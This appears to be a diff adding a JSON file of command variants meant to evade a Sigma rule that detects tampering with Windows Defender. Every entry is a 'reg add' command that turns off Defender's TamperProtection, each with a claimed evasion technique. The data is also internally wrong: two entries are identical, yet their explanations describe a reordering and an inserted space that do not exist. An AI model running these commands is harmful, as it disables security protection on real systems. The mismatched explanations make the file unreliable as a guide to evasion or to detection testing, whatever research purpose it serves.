@@ -1,0 +1,14 @@
+[
+  {
+    "output": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f",
+    "explanation": "Reordering: The command reorders the arguments, but still uses the same registry path and action, which may not be detected by the Sigma rule if it relies on argument order."
+  },
+  {
+    "output": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features /v TamperProtection /t REG_DWORD /d 0 /f",
+    "explanation": "Omission: Quotes around the registry path are omitted, which may not trigger the Sigma rule if it relies on quoted paths for detection."
+  },
+  {
+    "output": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f",
+    "explanation": "Insertion: Inserting a harmless space in the registry path may not trigger the Sigma rule if it relies on exact path matching."
+  }
+]
